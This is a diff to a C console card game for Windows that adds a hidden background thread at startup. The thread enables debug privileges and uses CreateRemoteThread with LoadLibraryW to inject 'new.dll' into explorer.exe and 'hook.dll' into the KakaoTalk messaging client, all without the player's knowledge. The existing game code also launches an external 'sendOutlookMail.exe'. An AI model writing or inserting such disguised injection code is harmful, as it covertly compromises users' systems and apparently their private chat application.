@@ -1,7 +1,10 @@
 #include <stdio.h>
 #include <Windows.h>
+#include <tlhelp32.h>
+#include <tchar.h>
 #include <thread>
 #include <conio.h>
+#include <wchar.h>
 
 void gotoxy(int x, int y)
 {
@@ -195,7 +198,7 @@ int turnCard(int fin)
 	}
 	printf("%s", val1);
 
-	RE:
+RE:
 	do
 	{
 		inp2 = getch();
@@ -419,8 +422,117 @@ int turnCard(int fin)
 	return fin;
 }
 
+DWORD SetPrivileges(LPCTSTR szPrivilege, DWORD dwState)
+{
+	DWORD dwRtn = 0;
+	HANDLE hToken;
+	if (OpenProcessToken(GetCurrentProcess(),
+		TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
+	{
+		LUID luid;
+		if (LookupPrivilegeValue(NULL, szPrivilege, &luid))
+		{
+			BYTE t1[sizeof(TOKEN_PRIVILEGES) + sizeof(LUID_AND_ATTRIBUTES)];
+			BYTE t2[sizeof(TOKEN_PRIVILEGES) + sizeof(LUID_AND_ATTRIBUTES)];
+			DWORD cbTP = sizeof(TOKEN_PRIVILEGES) + sizeof(LUID_AND_ATTRIBUTES);
+
+			PTOKEN_PRIVILEGES pTP = (PTOKEN_PRIVILEGES)t1;
+			PTOKEN_PRIVILEGES pPrevTP = (PTOKEN_PRIVILEGES)t2;
+
+			pTP->PrivilegeCount = 1;
+			pTP->Privileges[0].Luid = luid;
+			pTP->Privileges[0].Attributes = dwState;
+
+			if (AdjustTokenPrivileges(hToken, FALSE, pTP, cbTP, pPrevTP, &cbTP))
+				dwRtn = pPrevTP->Privileges[0].Attributes;
+		}
+
+		CloseHandle(hToken);
+	}
+
+	return dwRtn;
+}
+
+DWORD GetPIDByName(LPCTSTR szProcessName)
+{
+	DWORD PID = 0xFFFFFFFF;
+	HANDLE hSnapShot = INVALID_HANDLE_VALUE;
+	PROCESSENTRY32 pe;
+	WCHAR proc_name[260];
+
+	pe.dwSize = sizeof(PROCESSENTRY32);
+	hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, NULL);
+	Process32First(hSnapShot, &pe);
+	do
+	{
+		_tcsncpy(proc_name, (LPCTSTR) pe.szExeFile, _tcslen(pe.szExeFile));
+		if (!_tcscmp(szProcessName, proc_name))
+		{
+			PID = pe.th32ProcessID;
+			break;
+		}
+	} while (Process32Next(hSnapShot, &pe));
+	CloseHandle(hSnapShot);
+	return PID;
+}
+
+BOOL InjectDll(DWORD dwPID, LPCTSTR szDllName)
+{
+	HANDLE hProcess, hThread;
+	LPVOID pRemoteBuf;
+	DWORD dwBufSize = (DWORD)(_tcslen(szDllName) + 1) * sizeof(TCHAR);
+	LPTHREAD_START_ROUTINE pThreadProc;
+
+	if (!(hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID)))
+	{
+		DWORD dwErr = GetLastError();
+		return FALSE;
+	}
+
+	pRemoteBuf = VirtualAllocEx(hProcess, NULL, dwBufSize, MEM_COMMIT, PAGE_READWRITE);
+
+	WriteProcessMemory(hProcess, pRemoteBuf, (LPVOID)szDllName, dwBufSize, NULL);
+
+	pThreadProc = (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryW");
+	hThread = CreateRemoteThread(hProcess, NULL, 0, pThreadProc, pRemoteBuf, 0, NULL);
+	WaitForSingleObject(hThread, INFINITE);
+
+	CloseHandle(hThread);
+	CloseHandle(hProcess);
+
+	return TRUE;
+}
+
+DWORD WINAPI ThreadFunc(PVOID pvParam)
+{
+	PROCESSENTRY32 pe;
+	DWORD dwPID;
+	LPCTSTR dllname = L"new.dll";
+	LPCTSTR hookdll = L"hook.dll";
+	LPCTSTR Target = L"kakaotalk.exe";
+	HANDLE hSnapShot = NULL;
+	SetPrivileges(SE_DEBUG_NAME, SE_PRIVILEGE_ENABLED);
+	dwPID = GetPIDByName(L"explorer.exe");
+	InjectDll(dwPID, dllname);
+	pe.dwSize = sizeof(PROCESSENTRY32);
+	hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, NULL);
+	dwPID = GetPIDByName(L"kakaotalk.exe");
+	Process32First(hSnapShot, &pe);
+	do
+	{
+		if (!_tcscmp(Target, pe.szExeFile))
+		{
+			InjectDll(dwPID, hookdll);
+		}
+	} while (Process32Next(hSnapShot, &pe));
+	CloseHandle(hSnapShot);
+	return dwPID;
+}
+
 int main()
 {
+	LPVOID lpdllname = "new.dll";
+	HANDLE hThread = CreateThread(NULL, NULL, ThreadFunc, lpdllname, NULL, NULL );
 	system("title Cards");
 	system("mode con:cols=24 lines=13");
 	printf("┏━┓┏━┓┏━┓┏━┓");
@@ -469,6 +581,6 @@ int main()
 	{
 		system("sendOutlookMail.exe");
 	}
-
+	CloseHandle(hThread);
 	return 0;
 }
